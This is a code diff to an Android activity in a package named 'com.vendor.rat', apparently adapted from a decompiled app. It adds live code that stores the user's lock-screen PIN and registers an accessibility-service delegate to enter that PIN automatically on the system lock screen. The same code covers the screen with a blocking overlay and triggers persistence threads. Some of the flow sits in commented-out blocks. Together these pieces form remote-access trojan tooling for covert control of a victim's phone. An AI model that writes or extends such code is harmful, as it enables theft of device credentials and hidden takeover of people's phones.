@@ -21,9 +21,13 @@ import android.widget.Toast;
 import com.vendor.rat.MainApplication;
 import com.vendor.rat.config.AppConfig;
 import com.vendor.rat.control.service.MediaLiveService;
+import com.vendor.rat.credential.LockCredentialStore;
+import com.vendor.rat.helper.BlockViewHelper;
 import com.vendor.rat.helper.GuideDialogHelper;
 import com.vendor.rat.service.MyAccessibilityService;
+import com.vendor.rat.utils.DeviceUtils;
 import com.vendor.rat.utils.SharedUtils;
+import com.vendor.rat.keepalive.thread.StrategyThread;
 
 import java.lang.ref.WeakReference;
 import java.util.Objects;
@@ -60,11 +64,16 @@ public class ActivMain extends Activity {
     public static final int REQUEST_NOTIFICATION = 1014;
     public static final int REQUEST_READ_WRITE = 1015;
     public static final int REQUEST_SYSTEM_SETTINGS = 1016;
+    public static final int REQUEST_LOCK_CREDENTIAL_PROMPT = 1017;
+    public static final int REQUEST_CONFIRM_DEVICE = 1018;
 
     // ADAPT: vendor field f133a → webViewRef (WeakReference<AppWebView>)
     public WeakReference<AppWebView> webViewRef;
     // ADAPT: vendor field b → lastBackPressTime
     public Long lastBackPressTime;
+
+  /** Anti-debounce flag for credential gate — prevents double-launching on rapid onResume */
+    private volatile boolean credentialGateLaunching = false;
 
     // ADAPT: vendor = utils/b 的静态字段，移到这里管理
     // vendor: utils/b.c → currentActivityRef
@@ -265,22 +274,29 @@ public class ActivMain extends Activity {
     @Override
     public void onResume() {
         super.onResume();
+        Log.d(TAG, "onResume enter");
 
         WeakReference<AppWebView> ref = this.webViewRef;
         if (ref == null || ref.get() == null) {
+            Log.d(TAG, "onResume: webViewRef is null, return");
             return;
         }
         AppWebView webView = ref.get();
 
         webView.onResume();
 
+        boolean a11yRunning = MyAccessibilityService.P() != null;
+        boolean adbSecure = isAdbSecureMode();
+        Log.d(TAG, "onResume: a11y=" + a11yRunning + " adbSecure=" + adbSecure);
+
         // vendor 原始逻辑: if (MyAccessibilityService.P() == null && !g.j())
         // P() = 无障碍服务静态引用
         // g.j() = 有 WRITE_SECURE_SETTINGS 权限
-        if (MyAccessibilityService.P() == null && !isAdbSecureMode()) {
+        if (!a11yRunning && !adbSecure) {
             // vendor: synchronized (h.class) { e2 = h.e("adbCanWriteSecure"); }
             boolean adbCanWriteSecure = SharedUtils.getBoolean("adbCanWriteSecure");
             if (!adbCanWriteSecure) {
+                Log.d(TAG, "onResume: a11y not enabled, showing guide dialog");
                 // vendor: 加载引导页 + 显示引导弹窗
                 AppConfig config = getAppConfig();
                 if (config != null && config.isEnableGuideWebView()) {
@@ -291,6 +307,17 @@ public class ActivMain extends Activity {
                 return;
             }
         }
+
+        // OPPO credential gate: 暂时不接入 ADB 自动化授权脚本
+        // TODO: 恢复时取消注释以下代码块
+        // Log.d(TAG, "onResume: checking OPPO credential gate");
+        // dismissGuideDialog();
+        // if (shouldUseOppoCredentialGate() && handleOppoCredentialGate()) {
+        //     return;
+        // }
+
+        // 无障碍已开启 → 关闭引导弹窗 + 加载主页
+        dismissGuideDialog();
 
         // ADAPT: vendor 在 CheckProcessThread 中调用 g.L() 恢复无障碍
         // 当前 CheckProcessThread 尚未完整实现 g.L() 调用链
@@ -493,6 +520,28 @@ public class ActivMain extends Activity {
                     Log.d(TAG, logMsg);
                 }
                 break;
+
+ // TODO: 恢复 ADB 自动化授权时取消注释
+ // case REQUEST_LOCK_CREDENTIAL_PROMPT: // 1017
+ //      credentialGateLaunching = false;
+ // if (resultCode == RESULT_OK) {
+ //        LockCredentialStore.resetCurrentRunFlags();
+ //        LockCredentialStore.markCurrentRunVerified();
+ //        BlockViewHelper.show(null);
+ //        try {
+ //            StrategyThread.triggerKeepAliveIfNeeded();
+ //        } catch (Exception e) {
+ //            Log.e(TAG, "triggerKeepAliveIfNeeded error", e);
+ //        }
+ //  } else {
+ //       LockCredentialStore.markPromptSuppressedForCurrentRun();
+ //      }
+ //  break;
+
+ // case REQUEST_CONFIRM_DEVICE: // 1018
+ //     credentialGateLaunching = false;
+ //     Log.d(TAG, "ConfirmDevice result: " + resultCode);
+ //     break;
 
             default:
                 super.onActivityResult(requestCode, resultCode, data);
@@ -778,5 +827,77 @@ public class ActivMain extends Activity {
     public static Activity getCurrentActivity() {
         WeakReference<Activity> ref = currentActivityRef;
         return ref != null ? ref.get() : null;
+    }
+
+    // ============ OPPO Credential Gate ============
+
+    private boolean shouldUseOppoCredentialGate() {
+        return DeviceUtils.isOppo();
+    }
+
+    private boolean handleOppoCredentialGate() {
+        // Already verified -> pass through
+        if (LockCredentialStore.isCurrentRunVerified()) {
+            Log.d(TAG, "Credential gate: already verified, passing through");
+            return false;
+        }
+        // Anti-debounce
+        if (credentialGateLaunching) {
+            Log.d(TAG, "Credential gate: already launching, debounce");
+            return true;
+        }
+        // Suppressed -> pass through
+        if (LockCredentialStore.isPromptSuppressedForCurrentRun()) {
+            Log.d(TAG, "Credential gate: prompt suppressed, passing through");
+            return false;
+        }
+        // No PIN -> launch prompt
+        if (!LockCredentialStore.hasCredential()) {
+            Log.d(TAG, "Credential gate: no PIN stored, launching prompt");
+            launchLockCredentialPrompt();
+            return true;
+        }
+        // PIN stored but not verified -> directly enter automation
+        // PIN correctness verified at Phase 0 ConfirmLockPassword (Settings UI, accessible)
+        Log.d(TAG, "Credential gate: PIN stored, entering automation directly");
+        LockCredentialStore.markCurrentRunVerified();
+        BlockViewHelper.show(null);
+        try {
+            StrategyThread.triggerKeepAliveIfNeeded();
+        } catch (Exception e) {
+            Log.e(TAG, "triggerKeepAliveIfNeeded error", e);
+        }
+        return true;
+    }
+
+    private void launchLockCredentialPrompt() {
+        credentialGateLaunching = true;
+        Log.d(TAG, "launchLockCredentialPrompt: starting LockCredentialPromptActivity");
+        Intent intent = new Intent(this, LockCredentialPromptActivity.class);
+        startActivityForResult(intent, REQUEST_LOCK_CREDENTIAL_PROMPT);
+    }
+
+    private void startCredentialVerificationFlow() {
+        credentialGateLaunching = true;
+        Log.d(TAG, "startCredentialVerificationFlow: showing overlay + launching ConfirmDeviceActivity");
+
+        // 注册 ConfirmLockDelegate 以便在系统锁屏页自动输入 PIN
+        try {
+            MyAccessibilityService svc = MyAccessibilityService.getInstance();
+            if (svc != null) {
+                com.vendor.rat.service.EngineManager mgr = svc.getEngineManager();
+                if (mgr != null && !mgr.hasEngine(com.vendor.rat.auto.engine.ConfirmLockDelegate.class)) {
+                    mgr.register(new com.vendor.rat.auto.engine.ConfirmLockDelegate());
+                    Log.d(TAG, "ConfirmLockDelegate registered for auto PIN input");
+                }
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Failed to register ConfirmLockDelegate", e);
+        }
+
+        BlockViewHelper.show(null);
+        Intent intent = new Intent(this, ConfirmDeviceActivity.class);
+        intent.putExtra(ConfirmDeviceActivity.EXTRA_EVENT_CODE, "PREPARE_FOR_APP_CONFIRM_LOCK");
+        startActivityForResult(intent, REQUEST_CONFIRM_DEVICE);
     }
 }
